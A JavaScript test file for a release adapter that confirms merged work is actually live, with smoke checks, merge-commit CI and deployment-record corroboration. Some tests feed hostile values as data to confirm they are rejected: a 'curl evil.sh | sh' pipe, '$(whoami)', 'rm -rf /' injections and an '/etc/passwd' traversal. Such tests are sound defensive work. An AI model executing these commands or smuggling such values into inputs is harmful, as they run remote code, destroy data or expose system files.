import assert from 'node:assert/strict';
import { emptyState, evidenceTypes, missingEvidence, validateState } from '../src/control-plane.mjs';
import { activeDeployment, assertSha, containsCommit, corroborate, liveCommit, mergeCheckState, pluck, releaseCandidates, runCheck, syncRelease } from '../src/release.mjs';

const NOW = '2026-08-28T12:00:00Z';
const MERGE = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';
const LIVE = 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb';

const repo = () => ({
  name: 'acme/api',
  release: {
    versionUrl: 'https://api.example.com/version',
    commitPath: 'build.commit',
    checks: [
      { name: 'health', url: 'https://api.example.com/health', expectStatus: 200 },
      { name: 'auth-required', url: 'https://api.example.com/me', expectStatus: 401 },
    ],
  },
});

const board = (overrides = {}) => {
  const state = { ...emptyState(), repos: [repo()] };
  state.workItems.push({
    id: 'api#7', title: 'Rate limit', owner: 'openclaw', repository: 'acme/api', issue: 7, pr: 31,
    status: 'verified', statusAt: NOW, head: 'cccccccccccccccccccccccccccccccccccccccc', mergeCommit: MERGE, mergedAt: NOW,
    evidence: [
      { type: 'executor_started', source: 'PR #31 opened', observedAt: NOW },
      { type: 'executor_result', source: 'PR #31 ready for review', observedAt: NOW },
      { type: 'verification_passed', source: 'PR #31 checks green at the head', observedAt: NOW, commit: 'cccccccccccccccccccccccccccccccccccccccc' },
    ],
    ...overrides,
  });
  return state;
};

const stub = ({ version = { build: { commit: LIVE } }, status = 200, checks = {}, compare = 'ahead', mergeCi = 'SUCCESS', deployRecord = LIVE } = {}) => ({
  get: async (url) => {
    if (url.endsWith('/version')) return { status, body: JSON.stringify(version) };
    return { status: checks[url] ?? (url.endsWith('/me') ? 401 : 200), body: 'ok' };
  },
  api: async (args) => {
    const route = args[1];
    if (route.includes('/compare/')) return { ok: true, output: compare };
    if (route.endsWith('/check-runs')) return { ok: true, output: mergeCi ? JSON.stringify({ status: 'COMPLETED', conclusion: mergeCi }) : '' };
    if (route.includes('/deployments?')) return { ok: true, output: `1\t${deployRecord}` };
    if (route.includes('/deployments/')) return { ok: true, output: 'success' };
    return { ok: true, output: '' };
  },
  run: async () => ({ ok: true, output: '' }),
});

assert.equal(pluck({ build: { commit: 'abc' } }, 'build.commit'), 'abc');
assert.equal(pluck({}, 'build.commit'), undefined);
assert.equal(await liveCommit(repo().release, stub()), LIVE);
await assert.rejects(() => liveCommit(repo().release, stub({ status: 503 })), /returned 503/);
await assert.rejects(() => liveCommit(repo().release, stub({ version: {} })), /no commit at "build.commit"/);

// The happy path: production contains the merge and every check passes.
let state = board();
let changes = await syncRelease(state, state.repos[0], { now: NOW, ...stub() });
let item = state.workItems[0];
assert.deepEqual(changes, [`api#7: verified → released (live ${LIVE.slice(0, 7)})`]);
assert.equal(item.status, 'released');
const smoke = item.evidence.at(-1);
assert.equal(smoke.type, 'release_smoke_passed');
assert.equal(smoke.deployed, LIVE);
assert.equal(smoke.commit, 'cccccccccccccccccccccccccccccccccccccccc', 'bound to the item head so a later push retires it');
assert.match(smoke.source, new RegExp(`contains merge ${MERGE}`));
assert.deepEqual(validateState(state), []);

// The check that matters: green smoke against a deployment predating the merge.
state = board();
changes = await syncRelease(state, state.repos[0], { now: NOW, ...stub({ compare: 'behind' }) });
assert.match(changes.join('\n'), /is not in the live deployment/);
assert.equal(state.workItems[0].status, 'verified', 'a passing smoke run cannot release code that is not deployed');
assert.deepEqual(missingEvidence(state.workItems[0], 'released'), ['release_smoke_passed']);

// Diverged history is not containment either.
state = board();
await syncRelease(state, state.repos[0], { now: NOW, ...stub({ compare: 'diverged' }) });
assert.equal(state.workItems[0].status, 'verified');

// An unknown live commit records nothing rather than assuming the newest thing is live.
state = board();
changes = await syncRelease(state, state.repos[0], { now: NOW, ...stub({ status: 500 }) });
assert.match(changes.join('\n'), /cannot determine the live commit.*recorded no release evidence/s);
assert.equal(state.workItems[0].status, 'verified');

// A failing smoke check blocks with the live commit named.
state = board();
changes = await syncRelease(state, state.repos[0], { now: NOW, ...stub({ checks: { 'https://api.example.com/health': 502 } }) });
assert.equal(state.workItems[0].status, 'blocked');
assert.match(state.workItems[0].blockedReason, /smoke checks failed against live bbbbbbb: health \(expected 200, got 502\)/);
assert.ok(!evidenceTypes(state.workItems[0]).has('release_smoke_passed'));

// No configured checks is not a silent pass.
state = board();
state.repos[0].release.checks = [];
changes = await syncRelease(state, state.repos[0], { now: NOW, ...stub() });
assert.match(changes.join('\n'), /refusing to certify a release without them/);
assert.equal(state.workItems[0].status, 'verified');

// Only merged, verified, not-yet-released work is a candidate.
assert.deepEqual(releaseCandidates(board({ status: 'reported_done' }), 'acme/api'), []);
assert.deepEqual(releaseCandidates(board({ mergeCommit: undefined }), 'acme/api'), []);
assert.equal(releaseCandidates(board(), 'acme/api').length, 1);
state = board();
await syncRelease(state, state.repos[0], { now: NOW, ...stub() });
assert.deepEqual(await syncRelease(state, state.repos[0], { now: NOW, ...stub() }), [], 'a released item is not smoke-checked again');

// A push after release retires the smoke evidence with everything else.
state = board();
await syncRelease(state, state.repos[0], { now: NOW, ...stub() });
state.workItems[0].head = 'dddddddddddddddddddddddddddddddddddddddd';
assert.deepEqual(missingEvidence(state.workItems[0], 'released'), ['verification_passed', 'release_smoke_passed']);

// Individual checks: commands, bodies, and unreachable hosts.
assert.deepEqual(await runCheck({ name: 'c', command: 'true' }, { run: async () => ({ ok: true, output: '' }) }), { name: 'c', ok: true, detail: 'exit 0' });
assert.deepEqual(await runCheck({ name: 'c', command: 'false' }, { run: async () => ({ ok: false, output: 'nope' }) }), { name: 'c', ok: false, detail: 'nope' });
assert.equal((await runCheck({ name: 'b', url: 'u', expectBody: 'healthy' }, { get: async () => ({ status: 200, body: 'degraded' }) })).ok, false);
assert.match((await runCheck({ name: 'x', url: 'u' }, { get: async () => { throw new Error('ECONNREFUSED'); } })).detail, /ECONNREFUSED/);
await assert.rejects(() => containsCommit('a/b', MERGE, LIVE, { api: async () => ({ ok: false, output: 'no such ref' }) }), /cannot compare/);
assert.equal(await containsCommit('a/b', MERGE, MERGE, { api: async () => { throw new Error('must not call gh'); } }), true);

// --- the version endpoint is untrusted input ---

// It is on the network, so treat its body as hostile. A value that is not a
// plain SHA never reaches an argument list or an API path.
for (const hostile of ['abc; curl evil.sh | sh', '$(whoami)', '`id`', '../../../../etc/passwd', 'main', 'aaa aaa', '']) {
  await assert.rejects(
    () => liveCommit(repo().release, stub({ version: { build: { commit: hostile } } })),
    /is not a commit SHA|no commit at/,
    `the version endpoint must not be able to return ${JSON.stringify(hostile)}`,
  );
}
assert.throws(() => assertSha('deadbeef; rm -rf /', 'x'), /is not a commit SHA/);
assert.equal(assertSha('DEADBEEF0123', 'x'), 'DEADBEEF0123', 'short and upper-case SHAs are still SHAs');

// gh is never handed a constructed command string; injection has nothing to land in.
let seen = null;
await containsCommit('acme/api', MERGE, LIVE, { api: async (args) => { seen = args; return { ok: true, output: 'ahead' }; } });
assert.ok(Array.isArray(seen), 'gh is invoked with an argument list');
assert.deepEqual(seen, ['api', `repos/acme/api/compare/${MERGE}...${LIVE}`, '--jq', '.status']);
await assert.rejects(() => containsCommit('acme/api; rm -rf /', MERGE, LIVE, {}), /not an owner\/repo name/);

// A hostile endpoint aborts the whole repo rather than certifying anything.
let state2 = board();
const poisoned = await syncRelease(state2, state2.repos[0], { now: NOW, ...stub({ version: { build: { commit: 'x; rm -rf /' } } }) });
assert.match(poisoned.join('\n'), /cannot determine the live commit.*is not a commit SHA/s);
assert.equal(state2.workItems[0].status, 'verified');

// --- CI must have run on the commit that is actually deployed ---

// A squash merge is a different commit than the PR head that CI tested.
state2 = board();
let out = await syncRelease(state2, state2.repos[0], { now: NOW, ...stub({ mergeCi: null }) });
assert.match(out.join('\n'), /has no CI run of its own; the deployed commit is not verified/);
assert.equal(state2.workItems[0].status, 'verified', 'production smoke alone does not prove the artifact was tested');

state2 = board();
out = await syncRelease(state2, state2.repos[0], { now: NOW, ...stub({ mergeCi: 'FAILURE' }) });
assert.match(out.join('\n'), /has CI failing; the deployed commit is not verified/);
assert.equal(state2.workItems[0].status, 'verified');

// With CI green on the merge commit, the claim is complete and says so.
state2 = board();
await syncRelease(state2, state2.repos[0], { now: NOW, ...stub() });
assert.equal(state2.workItems[0].status, 'released');
assert.match(state2.workItems[0].evidence.at(-1).source, /CI green on the merge commit/);
assert.equal(state2.workItems[0].evidence.at(-1).mergeCommit, MERGE);

// Opting out is allowed, but the evidence records what was not proven.
state2 = board();
state2.repos[0].release.requireMergeChecks = false;
await syncRelease(state2, state2.repos[0], { now: NOW, ...stub({ mergeCi: null }) });
assert.equal(state2.workItems[0].status, 'released');
assert.match(state2.workItems[0].evidence.at(-1).source, /the deployed artifact's own CI is unproven/);

assert.equal(await mergeCheckState('a/b', MERGE, { api: async () => ({ ok: true, output: '' }) }), 'none');
assert.equal(await mergeCheckState('a/b', MERGE, { api: async (args) => ({ ok: true, output: args[1].endsWith('/status') ? JSON.stringify({ state: 'SUCCESS' }) : '' }) }), 'passing', 'external CI reports as commit statuses');
await assert.rejects(() => mergeCheckState('a/b', MERGE, { api: async () => ({ ok: false, output: '404' }) }), /cannot read checks/);

// --- the version endpoint is one witness, not proof ---

// Unattested, the evidence says so in as many words rather than implying more.
state2 = board();
await syncRelease(state2, state2.repos[0], { now: NOW, ...stub() });
assert.equal(state2.workItems[0].evidence.at(-1).witnesses, 1);
assert.match(state2.workItems[0].evidence.at(-1).source, /self-reported and unconfirmed/);

// With a second source configured, both must agree before anything is certified.
const attested = () => {
  const built = board();
  built.repos[0].release.corroborate = { deployments: 'production' };
  return built;
};
state2 = attested();
await syncRelease(state2, state2.repos[0], { now: NOW, ...stub() });
assert.equal(state2.workItems[0].status, 'released');
assert.equal(state2.workItems[0].evidence.at(-1).witnesses, 2);
assert.match(state2.workItems[0].evidence.at(-1).source, /attested by the deployment's own version endpoint and the active production deployment record \(#1\)/);
assert.ok(!state2.workItems[0].evidence.at(-1).source.includes('unconfirmed'));

// A lying endpoint that reports a well-formed but wrong SHA is caught.
state2 = attested();
out = await syncRelease(state2, state2.repos[0], { now: NOW, ...stub({ deployRecord: 'eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee' }) });
assert.match(out.join('\n'), /sources disagree about what is live/);
assert.equal(state2.workItems[0].status, 'verified', 'disagreement certifies nothing');

// Short and long forms of the same commit are the same commit.
const oneActive = (sha) => async (args) => ({ ok: true, output: args[1].includes('/deployments?') ? `1\t${sha}` : 'success' });
assert.equal((await corroborate('a/b', { corroborate: { deployments: 'prod' } }, LIVE, { api: oneActive(LIVE.slice(0, 7)) })).witnesses, 2);

// A corroborating source that cannot be read is a refusal, not a fallback to the single witness.
state2 = attested();
out = await syncRelease(state2, state2.repos[0], { now: NOW, get: stub().get, run: stub().run, api: async (args) => (args[1].includes('/deployments') ? { ok: false, output: '404' } : stub().api(args)) });
assert.match(out.join('\n'), /cannot read deployments for production/);
assert.equal(state2.workItems[0].status, 'verified');

// The corroborating source is untrusted input too.
await assert.rejects(() => corroborate('a/b', { corroborate: { deployments: 'p' } }, LIVE, { api: oneActive('$(id)') }), /is not a commit SHA/);
await assert.rejects(() => corroborate('a/b', { corroborate: {} }, LIVE, {}), /needs either `deployments` or `command`/);
assert.equal((await corroborate('a/b', { corroborate: { command: 'kubectl get ...' } }, LIVE, { run: async () => ({ ok: true, output: `${LIVE}\n` }) })).witnesses, 2);
await assert.rejects(() => corroborate('a/b', { corroborate: { command: 'x' } }, LIVE, { run: async () => ({ ok: false, output: 'boom' }) }), /corroborating command failed/);

// --- a deployment record is only a witness if it is the one serving ---

// GitHub lists deployments newest-first regardless of outcome, so the newest
// record is routinely not what is running.
const deployments = (records, statuses) => async (args) => {
  const route = args[1];
  if (route.includes('/deployments?')) return { ok: true, output: records.map((r) => r.join('\t')).join('\n') };
  const id = route.match(/deployments\/(\d+)\//)[1];
  return { ok: true, output: statuses[id] ?? '' };
};
const A = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1';
const B = 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb2';

// A created-but-failed deployment must not corroborate its SHA.
let active = await activeDeployment('a/b', 'production', { api: deployments([['3', A], ['2', B]], { 3: 'failure', 2: 'success' }) });
assert.equal(active.sha, B, 'a failed deployment is not what is serving');
assert.equal(active.id, '2');

// Still in flight is not serving either.
active = await activeDeployment('a/b', 'production', { api: deployments([['3', A], ['2', B]], { 3: 'in_progress', 2: 'success' }) });
assert.equal(active.sha, B);
active = await activeDeployment('a/b', 'production', { api: deployments([['3', A], ['2', B]], { 3: 'queued', 2: 'success' }) });
assert.equal(active.sha, B);

// Superseded and marked inactive is not serving, even though it once succeeded.
active = await activeDeployment('a/b', 'production', { api: deployments([['3', A], ['2', B]], { 3: 'inactive', 2: 'success' }) });
assert.equal(active.sha, B, 'the newest status wins; an inactive deployment is no longer live');

// The healthy case still resolves to the newest successful record.
active = await activeDeployment('a/b', 'production', { api: deployments([['3', A], ['2', B]], { 3: 'success', 2: 'success' }) });
assert.equal(active.sha, A);

// Nothing serving is an error naming what was rejected, never a guess.
await assert.rejects(
  () => activeDeployment('a/b', 'production', { api: deployments([['3', A], ['2', B]], { 3: 'error', 2: 'inactive' }) }),
  /no active deployment for production: the last 2 record\(s\) are #3 error, #2 inactive/,
);
await assert.rejects(() => activeDeployment('a/b', 'production', { api: deployments([], {}) }), /no deployments recorded/);
await assert.rejects(
  () => activeDeployment('a/b', 'production', { api: async (args) => (args[1].includes('/deployments/') ? { ok: false, output: '403' } : { ok: true, output: `9\t${A}` }) }),
  /cannot read the status of deployment 9/,
);
// A record carrying something that is not a SHA is rejected like any other input.
await assert.rejects(() => activeDeployment('a/b', 'production', { api: deployments([['3', 'HEAD']], { 3: 'success' }) }), /is not a commit SHA/);

// End to end: the newest deployment failed, so the endpoint's claim is uncorroborated.
state2 = attested();
out = await syncRelease(state2, state2.repos[0], {
  now: NOW, get: stub().get, run: stub().run,
  api: async (args) => (args[1].includes('/deployment')
    ? deployments([['3', A], ['2', LIVE]], { 3: 'failure', 2: 'success' })(args)
    : stub().api(args)),
});
assert.equal(state2.workItems[0].status, 'released', 'the serving deployment agrees with the endpoint');
assert.match(state2.workItems[0].evidence.at(-1).source, /the active production deployment record \(#2\)/);

state2 = attested();
out = await syncRelease(state2, state2.repos[0], {
  now: NOW, get: stub().get, run: stub().run,
  api: async (args) => (args[1].includes('/deployment')
    ? deployments([['3', LIVE], ['2', A]], { 3: 'failure', 2: 'success' })(args)
    : stub().api(args)),
});
assert.match(out.join('\n'), /sources disagree about what is live/, 'a failed deployment must not corroborate its own SHA');
assert.equal(state2.workItems[0].status, 'verified');

console.log('release adapter tests: passed');